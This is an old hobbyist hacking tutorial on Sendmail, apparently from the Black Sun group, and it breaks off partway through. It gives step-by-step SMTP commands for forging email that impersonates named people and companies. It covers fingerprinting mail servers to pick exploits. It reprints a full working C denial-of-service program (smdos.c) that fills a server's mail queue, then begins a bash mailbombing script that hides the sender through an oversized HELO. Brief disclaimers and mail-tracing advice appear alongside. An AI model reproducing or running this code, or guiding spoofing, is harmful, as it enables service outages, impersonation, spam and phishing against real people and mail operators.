@@ -1,0 +1,1316 @@
+The Sendmail Tutorial / written by yours truly, R a v e N (blacksun.box.sk)
+<============================================================================> version 2.4, 10/6/2000
+
+Note: whenever you see something like this: blah(1), it means that if you don't understand the meaning of the word blah there's an explanation for it just for you, located at the newbies corner on section 1.
+Note 2: if you're having a hard time reading this page because you have to scroll to the right whenever a long line comes, it's probably because you're not using "word wrapping".
+Most UNIX and Windows text editors do this by themselves.
+To activate word wrapping on Microsoft Notepad, simply go to Edit and then click on "Word wrapping".
+Note 3: Although this text file treats the Sendmail daemon, it is mostly applicable to any other SMTP daemon. 
+
+Author's notes
+==============
+If you have any comments or questions regarding this tutorial (no flames or spam, please) Email me at barakirs@netvision.net.il.
+Visit blacksun.box.sk for more tutorials, free hacking/programming/unix books to download and much more.
+
+Disclaimer
+==========
+We do not encourage any kinds of illegal activities. If you believe that breaking the law is a good way to impress someone, please stop reading now and grow up. There is nothing impressive or cool in being a criminal.
+
+Contents
+========
+Sendmail? Huh?
+* What is Sendmail?
+* What is it used for?
+* Why would I want to learn about Sendmail?
+How do I create authentically-looking fake mails?
+* You mean I can send Emails from bgates@microsoft.com or bclinton@whitehouse.org?!
+* Is it possible to create a 100% authentical Email?
+* How can I learn raw Sendmail commands by myself?
+* But what if I'm lazy? Can you pleeease teach me?
+* How do I track down carelessly-made fake mails?
+* How do I track down more sophisticated fake mails?
+* Can I get caught?
+* Will I get caught?
+Hack the server? Through Sendmail?!
+* Can I really hack a host that runs Sendmail?
+* So why is Sendmail called "the buggiest daemon on Earth" anyway?
+* Okay, great. Now how do I do it?
+* Can you tell me more about various Sendmail security holes?
+* Where can I find more Sendmail security holes?
+* How can I tell what version of Sendmail the target host is running?
+* Why should I care anyway?
+* How can I use the BugTraq archives to find the holes I'm looking for?
+* Can I get caught?
+* Will I get caught?
+* Final Notes
+Okay, so I can hack a host which runs Sendmail. How do I do it?
+* A Local DoS(29) in All Sendmail Versions Up to 8.9.3
+* Bug in Sendmail's HELO command
+* Giant Bug in Sendmail 8.8.4
+* Final Notes
+Newbies corner
+* What is a daemon?
+* What is a port?
+* What is a service?
+* What is a daemon banner?
+* What is a timeout (in computer terms)?
+* What is TCP and how does it work?
+* What is UDP and how does it work?
+* What is ICMP and how does it work?
+* What is an IP address?
+* What is a hostname?
+* How to find out what your ISP's mail servers are?
+* What is a portscanner?
+* What is a services scanner?
+* What/who is root?
+* What is bandwidth?
+* What is a client program?
+* What is a DNS server?
+* What is Telnet (the Telnet daemon and the Telnet program)
+* What is a command interpreter?
+* What is a shell account?
+* Who is a sysadmin?
+* What is hyper text?
+* What is an RFC?
+* What is InterNIC?
+* What is a sub domain (and how much does a domain really cost?)?
+* What is SSH?
+* What is a moderated mailing list / message board?
+* What is a DoS attack?
+* What is DUN?
+* What is a dial-up account?
+* What is a Unix password file?
+* What is a thread?
+Appendix A: Fake Daemons
+* Fake Sendmail daemon
+* Fake Telnet daemon
+Appendix B: Routing Mail
+* How can I route my mail?
+* How would that help me?
+Appendix C: Faking the sender's IP
+* How can I fake my IP on the Email's header?
+* Where can I read more about this kind of stuff?
+Appendix D: Reply-to
+* What does the Reply-to option do?
+* How do I use it?
+Appendix E: CC and BCC
+* What do these commands do?
+* How do I use them?
+Appendix F: Using Named to Create Ever More Authentic-Looking Fake Mails
+* How can I use named to create even more authentic-looking fake mails?
+Appendix G: Attachments
+* How can I send attached files through telnet?
+Appendix H: From and To
+* What do you mean by that?
+* How can I do it?
+References
+* RFC 821
+Bibliography
+* Sam Spade's Library
+* Various online magazines
+* BugTraq's archives
+* Packet Storm Security
+* Security Focus
+* Rootshell
+* Hackersclub
+Other tutorials by Black Sun
+* FTP Hacking.
+* Overclocking.
+* Ad and Spam Blocking.
+* Sendmail.
+* Phreaking.
+* Advanced Phreaking.
+* Phreaking II.
+* IRC Warfare.
+* Windows Registry.
+* Info Gathering.
+* Proxy/Wingate/SOCKS.
+* Offline Windows Security.
+* ICQ Security.
+* Hardware
+* Cracking, Part I.
+
+Sendmail? Huh?
+==============
+Sendmail is a daemon(1) which waits for connections on port(2) 25. It is used to send outgoing mail.
+For example: your Email provider (probably your ISP (Internet Service Provider)) probably uses two servers (unless it's a web-based mail account such as Hotmail.com):
+1) mail.boring-ISP.net (probably port 110): for incoming mail.
+2) mailgw.boring-ISP.net (port 25): for outgoing mail.
+Most of the time mail servers look pretty much like this, but the addresses vary from different ISPs.
+Mail.boring-ISP.net would require a username and a password so people won't be able to read your Emails, so let's skip this one (I might discuss cracking those passwords in another tutorial, but remember - I'm teaching you these things so you'll be able to know how malicious crackers work and not fall for their tricks, not for you to break the law and harm others). Now, as surprising as it may sound, mailgw.boring-ISP.net will not require a password or any other means of identification. If you telnet(19) into mailgw.boring-ISP.net on port 25 and type in the right commands you will be able to send fake mails. Interesting, huh?
+Now, the coolest part is that you can actually hack a server running Sendmail or at least bring it down, since Sendmail contains a crapload of bugs and security holes.
+
+How can I create authentically-looking fake mails?
+==================================================
+As mentioned in the previous chapter, sending mail does not require you to have an account on the machine you're sending the mail from (the mail server, not your computer). All you need to know is the IP Address(9) / Hostname(10) of the mail server and Sendmail commands.
+So far we assume that you know the IP/hostname of your target. If you still don't know this important detail, please find out(11).
+
+Now, let's get on with it. This time, unlike previous tutorials, I will "learn" all over again how to do everything I describe here and walk you through the entire process of learning and using what you have learnt.
+
+Alright, let's begin.
+Our target outgoing mail server for today is mailgw.someone.com on port 25.
+First, let's telnet into that port by either typing 'telnet mailgw.someone.com 25' (without the quotes) on a standard Unix text-based system, running C:\Windows\telnet.exe or your favorite telnet application and typing in mailgw.someone.com in the host field and 25 in the port field, or executing your favorite telnet application from XWindows (a graphical interface for Unix. If you're smart enough to be running some version of Unix you shouldn't have a hard time finding one. If you don't like the default telnet programs you could always go to www.linuxberg.com and grab one) and typing in the correct details (host and port).
+Note about VT: you might be asked to choose a terminal type during the connection process. Something with VT and some number in it... hmm...
+VT stands for Virtual Terminal. Since there are several types of terminals (all sorts of monitors, old printer terminals etc') you are asked to choose a terminal type (compatibility issues). VT100 should suite most people just fine.
+Note about shell accounts(21): if you're not running Unix and you wish to use Unix tools on Unix systems while you work, telnet to nether.net on port 23, login as newuser and get yourself a free shell account. If you'd rather user Window's tools (I use Window's stuff when I work from Windows, except certain conditions when I really NEED Unix and I don't want to reboot and boot it up. In that case, I get myself a shell account so I am able to use Unix stuff while working from Windows) go ahead (things will work faster since the tools are actually located on your machine, not on some distant computer which runs a shell account), but I still recommend that you will get a shell account at nether.net (in fact they teach you a lot of great Unix-newbies stuff when you sign up).
+Note about Telneting from Macintosh: Macintosh does not come with a Telnet program. However, you can download one from: http://www.ncsa.uiuc.edu/SDG/Software/MacTelnet/ (thanks to little_v for this one!).
+
+Now, let's see what we get after we telnet(19) to mailgw.someone.com:25 (in this case, the character : stands for 'on port', so mailgw.someone.com:25 means mailgw.someone.com on port 25).
+
+220 alpha.someone.com ESMTP Sendmail 8.9.3/8.8.6; Thu, 8 Jul 1999 21:46:04 +0000 (GMT).
+
+AHA! This is... this is... ugh... WHAT THE HELL IS THIS THING?!
+This, my friends, is a daemon banner(4), and it just gave us tons of valuable pieces of information!
+Normally, this info is intended for a client program(16) to determine what version of Sendmail the target is running and how to communicate with it (the program should know that, for example, every Sendmail version below 7.0.0 uses the command 'halb' instead of the command 'blah', etc').
+This daemon banner thing is also great for hackers and crackers, since we can determine what version our target is running. Later, when we will discuss about how to actually hack the server, this data would be EXTREMELY valuable.
+Okay, let's analyze what we've got...
+220... we don't know what this is right now...
+alpha.someone.com... no luck, can't make anything out of it so far...
+ESMTP... hmm... SMTP stands for Simple Mail Transfer Protocol. It is the protocol(18) used by email clients to communicate with Sendmail daemons, and this is what we're trying to learn right now. ESMTP is Extended SMTP. It's the same as SMTP, only it contains some more commands. Let's leave this alone for the time being.
+Sendmail 8.9.3/8.8.6 - AHA! There's something interesting. We got the version of the Sendmail daemon! Remember this, it will help us during the next chapter (hacking into servers who run Sendmail).
+The rest is garbage (time, date, etc' etc' etc').
+Okay, so let's move on... umm... how do I communicate with this thing?
+Er... let's try typing 'help' (without the quotes). Oh, by the way, it is normal not to see what you type when you talk to Sendmail since it won't send back your keystrokes. You have to turn on "local echo" in your telnet program in order to see what you type.
+
+214-This is Sendmail version 8.9.3
+214-Topics:
+214-    HELO    EHLO    MAIL    RCPT    DATA
+214-    RSET    NOOP    QUIT    HELP    VRFY
+214-    EXPN    VERB    ETRN    DSN
+214-For more info use "HELP <topic>".
+214-To report bugs in the implementation send email to
+214-    sendmail-bugs@sendmail.org.
+214-For local information send email to Postmaster at your site.
+214 End of HELP info
+
+Wee! This is cool!!
+By this time you should have guessed that this number (the 220 in the daemon banner and the 214 here) is actually a 'message type'. It states the type of the message you got. Each type of message (error because of this, error because of that, help page for this, confirmation message for that etc') has it's own number.
+Okay, let's move on. Let's try typing 'help helo'.
+
+214-HELO <hostname>
+214-    Introduce yourself.
+214 End of HELP info
+
+See? I told you so. 214 is the message type number for help messages.
+Okay, so that way you can practically teach yourself what every Sendmail command does. Stop right now, read all the help pages and then continue. It is important that you'll learn how to learn things by yourself. You might see some notes concerning the word RFC(24) and some numbers. You can find RFCs at http://www.linuxberg.com.
+Note about ESMTP: remember that ESMTP thing we came across? You'll be able to get a good clue on what ESMTP is by reading the help pages. Yes, I am trying to force you to read them... so please do. They contain tons of great information for newbies as well as pros.
+
+Okay, I'm assuming you've finished reading all those help pages. Now let's move on.
+First we need to enter a sender. We do this by typing 'MAIL FROM: <fake Email address>' (remove the quotes and replace fake Email address with the fake Email address of your choice, say... bgates@microsoft.com (but leave the < and the >)).
+
+The mail server should reply with this message:
+
+250 bgates@microsoft.com... Sender ok
+
+Next we type 'RCPT TO: <recipient>'. Replace recipient with the target, say victim@victim.com. We should get
+
+250 victim@victim.com... Recipient ok
+
+You can add recipient by simply doing this command several times, only with different recipients.
+
+Now, let's move on to the actual message body. Type 'data' to start writing the body of the message.
+
+354 Enter mail, end with "." on a line by itself
+
+Now let's type in some stuff...
+
+Subject: fake message            (note about this line: in this line you get to determine what subject you want to give for your message).
+Hello. This is a fake Email message.
+I'm bored.
+Gimme something to hack!!
+.
+
+Now we get this
+
+250 CAA15313 Message accepted for delivery
+
+You must be wondering right now what the heck is that number after the 250. This is called the message ID (or MID). It's just a stupid number, but we'll use them later... don't you worry your pretty head about this.
+
+Now, if you were the recepient you would have got a 100% reliably-looking fake mail. OR IS IT?
+
+Let's take a look at what the recepient would get...
+Hmm... welp, looks like an ordinary message to me. At least it does to the ordinary user.
+Now let's look at the headers.
+Headers are a couple of lines which come with every Email address. Most of today's Email clients show only the simpler parts of the header (sender, subject, date and time etc'), but right now we need the full header.
+On Netscape Messanger displaying the full headers is done by going to View ==> Headers ==> All.
+On Eudora this is done by clicking on the button which displays the "blah blah blah" caption when you put your mouse cursor above it for a second or two.
+Compuserve automatically displays the full header.
+On Outlook, right click the message on your inbox, choose properties and choose details.
+On pine, you should have an option somewhere in the configuration screens that let's you choose what kind of header you want to view (full or briefed).
+Now let's take a look at the full header, shall we?
+
+Received: from alpha.netvision.net.il (alpha.netvision.net.il [194.90.1.13]) by cmx.netvision.net.il (8.9.3/8.9.3) with ESMTP id CAA15313 for victim@victim.com>; Sat, 10 Jul 1999 02:49:59 +0300 (IDT)
+From: bgates@microsoft.com
+Received: from some.hostname.crap.com (some.hostname.crap.com [62.0.146.225]) by alpha.someone.com (8.9.3/8.8.6) with SMTP id CAA15313 for victim@victim.com; Sat, 10 Jul 1999 02:55:46 +0300 (IDT)
+Date:  Sat, 10 Jul 1999 02:55:46 +0300 (IDT)
+Message-ID: <199907092355. CAA15313@alpha.someone.com>
+X-Authentication-Warning: alpha.someone.com: some.hostname.crap.com [62.0.146.225] didn't use HELO protocol
+Subject: Fake mail
+Status:
+X-Mozilla-Status: 8001
+X-Mozilla-Status2: 00000000
+X-UIDL: 3752da3b000002ff
+
+Yeehaw! Look at all those numbers and letters and shiny things!
+Let's start from the top, shall we?
+
+Received: from alpha.someone.com (alpha.someone.com [194.90.1.13]) by cmx.someone.com (8.9.3/8.9.3) with ESMTP id CAA16970 for >; Sat, 10 Jul 1999 02:49:59 +0000 (GMT)
+
+Okay, so the mail was received from alpha.someone.com (alpha.someone.com [194.90.1.13]). What does that mean?
+A quick checkup on InterNIC(25)'s databases (type 'whois alpha.someone.com' without the quotes on a Unix system or download SamSpade for Windows at www.samspade.org) reveals that it is owned by someone.com. This is probably some kind of a sub-server they use to send mail. Let's leave it alone, it's not important to us right now. The (alpha.someone.com [194.90.1.13]) part shows you the hostname(10) and the IP address (9) of the server the Email was sent from.
+Ooh, ooh, wait! Wasn't the mail supposed to be sent from microsoft.com? I mean, the sender is bgates@microsoft.com!
+If we did the mail forging thing on microsoft.com instead of on someone.com this wouldn't have happened, now would it? It would have seemed like an ordinary Email... from Bill Gates... well, at least so far.
+Anyway, the rest is just the MID (which we will get to later) and the date of the message (the sending date) according to the server which the message was sent from. The +0000 (GMT) part means that it was sent from the Greenwich time zone. If it was sent, for example, from the +0200 time zone it would have meant that this time zone's time is actually Greenwich time plus 2 hours. Find our your time zone first so you'll be able to switch time zones and find out when was the message sent in your time.
+Now, on to more important things.
+
+From: bgates@microsoft.com
+
+Well, I guess this line is obvious... let's move on.
+
+Received: from some.hostname.crap.com (some.hostname.crap.com [62.0.146.225]) by alpha.someone.com (8.9.3/8.8.6) with SMTP id CAA15313 for victim@victim.com; Sat, 10 Jul 1999 02:55:46 +0300 (IDT)
+
+Okay, now this is really interesting. Now we get the sender's hostname and IP address.
+Note about the hostname: a dial-up(31) user will have a long and twisted hostname. For example: my hostname right now (at least when I was writing these lines) is RAS4-p97.hfa.netvision.net.il. Netvision.net.il is my ISP, and the rest is mostly crap (pay close attention to the hfa thing. Hfa stands for Haifa, which is my home town. It means that I'm connected through Netvision's Haifa server. See? Hostnames can be interesting).
+You must have noticed by now that the hostname we got is certainly not from microsoft.com, and that the mail server who sent this isn't exactly microsoft.com or a microsoft sub-domain(26) either, which clearly shows that this Email is completely fake.
+Another note about the hostname: sometimes you might not get a hostname, but you will always get an IP address. You can find the IP's hostname (most IP addresses do have a hostname) by doing 'nslookup ip-address' without the quotes on a Unix system or going to http://www.samspade.org and using their DNS(17) Lookup Tool. If you still can't get it, try doing a whois.
+To overcome this problem, you need to do two things:
+1) Send this mail from Microsoft's Sendmail server.
+2) Send this mail from an account that is connected to the web through Microsoft. If you can't get one, it will clearly show in the headers that the mail wasn't sent from Microsoft.
+
+Note: nice trick to pull on someone: if your ISP is blah.com, you can send your friends an Email from admin@blah.com which will look 100% authentic!
+
+Anyway, the next few characters give us the MID (Message ID), as well as other pieces of info. I promised we'll get to the MID, didn't I?
+If you think someone is trying to trick you into thinking he's somebody else, send an Email to abuse@your.ISP.com or abuse@the.ISP.where.the.message.came.from.com (in this case Microsoft.com) or abuse@the.server.who.stores.the.MID.com.
+To know which server stores the MID, we'll need to skip a few lines (two lines actually - time and date) and get straight to this:
+
+Message-ID: <199907092355. CAA15313@alpha.someone.com>
+
+Aha! Look at these interesting numbers! And check this out: CAA15313@alpha.someone.com! This means all the info regarding the MID is stored at alpha.someone.com! Let's send an Email to abuse@alpha.someone.com and tell them that we think we received a fake mail, and include the entire header. Next thing we'll do the same with the ISP of the sender (in our case, the sender is some.hostname.crap.com [62.0.146.225], meaning his ISP is probably crap.com).
+
+Now, on to the next line:
+
+X-Authentication-Warning: alpha.someone.com: some.hostname.crap.com [62.0.146.225] didn't use HELO protocol
+
+Damn! I knew we forgot something! Now let's do it all over again, but this time we'll type HELO microsoft.com at the beginning.
+
+HELO microsoft.com
+
+We get this:
+
+250 mailgw1.netvision.net.il Hello some.hostname.crap.com [62.0.146.225], pleased to meet you
+
+The rest is exactly like in the last time (sender, rcpt to, etc' etc'). Now let's see what victim@victim.com would have gotten.
+
+Aha! No X-Authentication-Warning!
+
+Final notes
+-----------
+I hope you enjoyed this chapter. Now you've learnt how to play harmless and legal tricks on your friends, how to spike-down fake mails and how easy it is to catch you if you're trying to do illegal stuff.
+Oh, and by the way, there is a way to hide your IP/hostname when faking mail... for more information, read the second section in the 'Okay, so I can hack a host which runs Sendmail. How do I do it?' chapter.
+
+Hack the server? Through Sendmail?!
+===================================
+Yeah, sure, why not? I mean, EVERY service(3) is vulnerable to some attacks. That's why it is recommended to run as less services possible on your computer.
+But the most vulnerable one is Sendmail (this is why it is called 'the buggiest daemon on Earth' or 'the buggiest daemon on the planet'). A member of the mailing list once told me that he just can't wait to read the Sendmail Tutorial (this was before this tutorial has been released) and that he himself runs Sendmail on his computer. Running Sendmail on a personal computer is unnecessary and dangerous. If your computer does not act as a mail server, there is no reason for you to run Sendmail (unless you want people to be able to send mail to your-account@your.IP.address instead of your-account@your.ISP.com. Note about your-account: in the first address, your-account is the name of your username on your own computer (Unix users should know what I am talking about). In the second address, your-account is your username at your ISP).
+Note: the information in this chapter can be either used to hack servers, or the other way around - to protect your server. Please don't break the law, or at least don't spew out my name during the investigations... hehe...
+
+Okay, so the first thing we have to do in order to hack a server through a specific service (or to improve the security of a specific server) is it's (the service's) version. This can be easily done by viewing the daemon banner(4). Suppose we came across a computer that runs Sendmail 8.8.3 (which was quite old when this tutorial was written, meaning there should be a couple of bugs here. Sendmail is upgraded mostly when a new bug is found. In fact, everything except of the daemon's security is rarely changed during upgrades).
+Next thing we'll try to determine the OS (Operating System) which this daemon runs on. If Sendmail's banner won't tell us, the Telnet(19) daemon will. First telnet to port 23 and cross your fingers. If there's a daemon on that port, it's probably the Telnet daemon, and it'll probably give you the name and version of the OS. If not, you can either:
+1) Try looking for a guest account (username: guest, password: guest or username: newuser, password: newuser), since some systems give you these details only after you log in.
+2) Email admin@your-target.com and ask him (I recommend opening a mailbox on one of those free mailbox services such as Hotmail and Emailing him from there, since some admins(22) might get a little suspicious...).
+3) Try going to your target's website. This kind of information might be there, somewhere.
+
+If you still didn't find the OS, fear not! We might still be able to do a cool hack without this information, but still this information might come in handy, so do all you can to get your hands on it.
+
+Next thing, you browse some online databases until you find the hole you've been looking for. First of all I'll explain about the largest and most recommended online databases, and then I'll teach you how to search them, plus some valuable concepts and words you need to get familiar with.
+
+Packet Storm Security
++++++++++++++++++++++
+URL: http://packetstorm.securify.com.
+One of the largest online databases for security-related information. I recommend going there once a day and reading the 'New Files Today' section, whether you're looking for specific holes or not.
+The archive was founded by Ken Williams and gets hundreds of thousands of hits per week.
+It has recently been transferred into the ownership of Kroll-O-Nagra (www.securify.com).
+
+Security Focus
+++++++++++++++
+URL: http://www.securityfocus.com.
+Another comprehensive database. Updated daily. These guys never sleep!
+
+BugTraq
++++++++
+URL: hosted by Security Focus (http://www.securityfocus.com), previously hosted by Netspace (http://www.netspace.org).
+BugTraq is one of the best security mailing list out there. The list is moderated, meaning that if you find a new security hole, you can only send your message to the moderator, Aleph1 (aleph1@underground.org). Aleph1 filters out all the spam, lame messages and old bugs and posts only the good ones to the list.
+I recommend signing up at http://www.securityfocus.com. You can also search their archive, which is by the way my favorite security-related database, by going to securityfocus.com and looking for a link called 'search'.
+
+Searching
+*********
+If we are looking for a bug in Sendmail 8.8.3, we'll need to type the following search keywords: 'sendmail 8.8.3' (without the quotes). If we're looking for something specific, such as a local DoS(29) attack against any version of sendmail, we will use the following search keywords: 'local DoS sendmail', etc'.
+
+Searching Packet Storm
+++++++++++++++++++++++
+Packet Storm should have a search box somewhere (Ken changes the layout every now and then so I can't give you the exact location of the box). You can divide the search results you will get into two categories: texts and programs.
+For example: you searched for a specific hole and you got a couple of text files and a couple of programs. The text files explain about the bugs and how to exploit it, while the programs use the hole to get in.
+These programs are often called 'exploits' and usually come as a source code instead of as a binary file. Let me explain: a binary file is any file that isn't made of text. Executable files are usually binary files. Now, in our case, programs come as sources instead of binary. Sources are in the form of plain text, and they're actually a bunch of commands. When given to a compiler, this source code turns into an executable binary (except for source codes written in the Perl programming language, which can be executed in the form of sources if you have the right program). Anyway, these programs come in the form of sources so you will be able to understand how they work instead of blindly running them.
+
+Searching Security Focus
+++++++++++++++++++++++++
+Security Focus offers more organized information. Instead of various bits of information, Security Focus offers articles. These include exact definitions of the bug, where and when it should happen, work-arounds (how to solve it) etc'. The only backdrop in Security Focus is that it is smaller than other databases.
+
+BugTraq
++++++++
+Ah... my favorite database. When people post something to BugTraq about a security hole they found, other people can reply to them and share their side of the story. For example: did it work on their computer too, how to fix the bug in various ways, what causes the bug in the first place etc'. You can compile a full database with all of the necessary information by simply reading a couple of posts.
+
+Getting Caught
+**************
+If you're planning on doing something bad, please don't. You can get caught. Better crackers than you already got caught. Don't be stupid.
+
+Okay, so I can hack a host which runs Sendmail. Now how do I do it?
+===================================================================
+I have made a nice list with several security holes regarding Sendmail just to give you the hang of it.
+
+A Local DoS(29) in All Sendmail Versions Up to 8.9.3 (taken from Packet Storm)
+****************************************************
+Date: Sat, 3 Apr 1999 00:42:56 +0200
+From: "[iso-8859-2] Micha³ Szymañski" <siwa9@BOX43.GNET.PL>
+To: BUGTRAQ@netspace.org
+Subject: Re: Possible local DoS in sendmail
+
+Hi folks,
+
+This local queue filling DoS attack in sendmail is quite dangerous. But good
+security policy (like mine) will prevent attackers from doing such things.
+Control files (in /var/spool/mqueue) created by 'sendmail -t' are owned by
+root.attacker's_group; turn on quotas for group 'attacker's_group' on the
+file system containing /var/spool/mqueue directory, and your host will be not
+vulnerable; but you _have to_ configure your sendmail as _nosuid_ daemon;
+
+Much more dangerous are remote queue filling DoS attacks. If you have enabled
+relaying, you can use shown below smdos.c proggie; it will quite fast fullfill
+partition on disk where /var/spool/mqueue resides. you should notice increased
+LA during attack; in contrast to local DoS attacks, control files created by
+smdos.c are owned by root.root, so ... it's much more difficult to prevent
+offenders from doing it;
+
+don't forget to change BSIZE definition (in smdos.c) to appropriate victim's
+host message size limitation (MaxMessageSize option); you can also increase
+MAXCONN definition.
+
+smdos.c:
+
+--- CUT HERE ---
+/*
+By Michal Szymanski <siwa9@box43.gnet.pl>
+
+Sendmail DoS (up to 8.9.3);
+
+Sat Apr  3 00:12:31 CEST 1999
+*/
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <errno.h>
+
+#undef VERBOSE          /* define it, if MORECONN is undefined */
+
+#define MORECONN
+
+// #define RCPT_TO      "foo@ftp.onet.pl"
+
+#define RCPT_TO "foo@10.255.255.255"
+
+#ifdef MORECONN
+#define MAXCONN 5
+#endif
+
+#define BSIZE   1048576         /* df* control file size */
+#define PORT    25
+
+char buffer[BSIZE];
+int sockfd,x,loop,chpid;
+
+void usage(char *fname) {
+fprintf(stderr,"Usage: %s <victim_host>\n",fname);
+exit(1);
+}
+
+void say(char *what) {
+
+if (write(sockfd,what,strlen(what))<0) {
+perror("write()");
+exit(errno);
+}
+
+#ifdef VERBOSE
+fprintf(stderr,"<%s",what);
+#endif
+
+bzero(buffer,BSIZE);
+
+usleep(1000);
+
+if (read(sockfd,buffer,BSIZE)<0) {
+perror("read()");
+exit(errno);
+}
+
+#ifdef VERBOSE
+fprintf(stderr,buffer);
+#endif
+}
+                        
+
+int main(int argc,char *argv[]) {
+struct sockaddr_in serv_addr;
+struct hostent *host;
+char *hostname,hostaddr[20];
+
+fprintf(stderr,"Sendmail DoS (up to 8.9.3) by siwa9 [siwa9@box43.gnet.pl]\n");
+
+if (argc<2) usage(argv[0]);
+
+#ifdef VERBOSE
+fprintf(stderr,">Preparing address. \n");
+#endif
+
+hostname=argv[1];
+
+serv_addr.sin_port=htons(PORT);
+serv_addr.sin_family=AF_INET;
+
+if ((serv_addr.sin_addr.s_addr=inet_addr(hostname))==-1) {
+
+#ifdef VERBOSE
+fprintf(stderr,">Getting info from DNS.\n");
+#endif
+
+if ((host=gethostbyname(hostname))==NULL) {
+herror("gethostbyname()");
+exit(h_errno);
+}
+
+serv_addr.sin_family=host->h_addrtype;
+
+bcopy(host->h_addr,(char *)&serv_addr.sin_addr,host->h_length);
+
+#ifdef VERBOSE
+fprintf(stderr,">Official name of host: %s\n",host->h_name);
+#endif
+
+hostname=host->h_name;
+
+sprintf(hostaddr,"%d.%d.%d.%d",(unsigned char)host->h_addr[0],
+                               (unsigned char)host->h_addr[1],
+                               (unsigned char)host->h_addr[2],
+                               (unsigned char)host->h_addr[3]);
+
+}
+else sprintf(hostaddr,"%s",hostname);
+
+#ifdef MORECONN
+for (;loop<MAXCONN;loop++) if (!(chpid=fork())) {
+#endif
+
+for(;;) {
+
+bzero(&(serv_addr.sin_zero),8);
+
+if ((sockfd=socket(AF_INET,SOCK_STREAM,0))==-1) {
+perror("socket()");
+exit(errno);
+}
+
+if ((connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr))) == -1) {
+perror("connect()");
+exit(errno);
+}
+
+#ifdef VERBOSE
+fprintf(stderr,">Connected to [%s:%d].\n",hostname,PORT);
+#endif
+
+bzero(buffer,BSIZE);read(sockfd,buffer,BSIZE);
+#ifdef VERBOSE
+fprintf(stderr,buffer);
+#else
+fprintf(stderr,".");
+#endif
+
+say("helo foo\n");
+say("mail from:root@localhost\n");
+say("rcpt to:" RCPT_TO "\n");
+say("data\n");
+
+for (x=0;x<=BSIZE;x++) buffer[x]='X';write(sockfd,buffer,BSIZE);
+
+say("\n.\n");
+sleep(1);
+say("quit\n");
+
+shutdown(sockfd,2);
+
+close(sockfd);
+
+#ifdef VERBOSE
+fprintf(stderr,">Connection closed succesfully.\n");
+#endif
+}
+#ifdef MORECONN
+}
+waitpid(chpid,NULL,0);
+#endif
+return 0;
+}
+--- CUT HERE ---
+
+Bug in Sendmail's HELO Command (taken from rootshell.com)
+******************************
+Note: this won't get you root access(14) or get you into partsin a system you're not supposed to get into, but this is still pretty cool. In fact, it let's you hide your IP/hostname when faking mail!
+
+
+[ http://www.rootshell.com/ ]
+
+We've had this exploit since January but sat on it until everyone had a
+change of implementing a stable version of sendmail 8.9.x.  (And because the
+last thing I want to do is help the spammers)  It has now made its way to
+Bugtraq so without further ado.
+
+--Rootshell 5/28/98
+
+
+Date:         Fri, 22 May 1998 12:36:54 +0300
+From:         Valentin Pavlov <root@PNS.NETBG.COM>
+Subject:      about sendmail 8.8.8 HELO hole
+
+I assume this this is pretty old (10 Jan 1998) but still...
+
+I found a pretty simple way to prevent the hiding of the sender's IP
+address. The method to hide the IP address of the sender is described
+bellow. Now, if we want to keep track of such exploit attempts, we have to
+compile sendmail 8.8.8 with a PICKY_HELO_CHECK defined in conf.h:
+
+#define PICKY_HELO_CHECK 1
+
+This will force sendmail to syslog an authentication warning
+(message with LOG_INFO level) and include an X-Authentication-Warning:
+header in the message, saying what host tried to hide itself. Check out
+the source (srvrsmpt.c, main.c). Also, LogLevel must be set to a value
+higher than 3 (default is 9) in sendmail.cf.
+
+
+regards,
+capone
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Make source, not [high]score
+----------------------------
+Valentin 'Val Capone' Pavlov
+----------------------------
+capone@netbg.com,  UKTC87203
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+Now for the original message, describing the exploit:
+
+-----Original Message-----
+From: Micha³ Zalewski <lcamtuf@boss.staszic.waw.pl>
+To: info@rootshell.com <info@rootshell.com>
+Date: 10 stycznia 1998 12:28
+Subject: Sendmail 8.8.8 (qmail?) HELO hole.
+
+
+Here's a brief description of Sendmail (qmail) hole I found
+recently:
+
+When someone mailbombs you, or tries to send fakemail, spam, etc -
+sendmail normally attachs sender's host name and it's address
+to outgoing message:
+
+--
+>From spam@flooders.net Mon Jan  5 22:08:21 1998
+Received: from spammer (marc@math.university.edu [150.129.84.5])
+          by myhost.com (8.8.8/8.8.8) with SMTP id WAA00376
+          for lcamtuf; Mon, 5 Jan 1998 22:07:54 +0100
+Date: Mon, 5 Jan 1998 22:07:54 +0100
+From: spam@flooders.net
+Message-Id: <3.14159665@pi>
+
+MAILBOOM!!!
+--
+
+That's perfect - now you know, who is responsible for that annoying
+junk in your mailbox: "Received: from spammer (marc@math.university.edu
+[150.129.84.5])". Nothing easier...
+But I found a small hole, which allows user to hide it's personality,
+and send mails anonymously. The only thing you should do is to
+pass HELO string longer than approx. 1024 B - sender's location and
+other very useful information will be cropped!!! Message
+headers should become not interesting. Sometimes, sender
+may become quite untraceable (but not always, if it's possible
+to obtain logs from machine which has been used to sent):
+
+--
+>From spam@flooders.net Mon Jan  5 22:09:05 1998
+Received: from xxxxxxxxxxxxxx... [a lot of 'x's] ...xxxx
+Date: Mon, 5 Jan 1998 22:08:52 +0100
+From: spam@flooders.net
+Message-Id: <3.14159665@pi>
+
+MAILBOOM!!! Now guess who am I...
+--
+
+
+Here's a simple example of Sendmail's HELO hole usage. Note, this
+script has been written ONLY to show how easy may be sending
+fakemails, mailbombs, with cooperation of Sendmail ;) Script is
+very slow and restricted in many ways, but explains the problem
+well (note, some of non-Berkeley daemons are also affected,
+probably Qmail?):
+
+-- EXPLOIT CODE --
+#!/bin/bash
+TMPDIR=/tmp/`whoami`
+PLIK=$TMPDIR/.safe
+TIMEOUT=2
+LIMIT=10
+MAX=20
+
+echo
+echo "SafeBomb 1.02b -- sendmail HELO hole usage example"
+echo "Author: Michal Zalewski <lcamtuf@boss.staszic.waw.pl>"
+echo
+
+if [ "$4" = "" ]; then
+  echo "USAGE: $0 msgfile address server sender"
+  echo
+  echo "  msgfile - file to send as a message body"
+  echo "  address - address of lucky recipient"
+  echo "  server  - outgoing smtp server w/sendmail"
+  echo "  sender  - introduce yourself"
+  echo
+  echo "WARNING: For educational use ONLY. Mailbombing is illegal."
+  echo "Think twice BEFORE you use this program in any way. Also,"
+  echo "I've never said this program is 100% safe nor bug-free."
+  echo
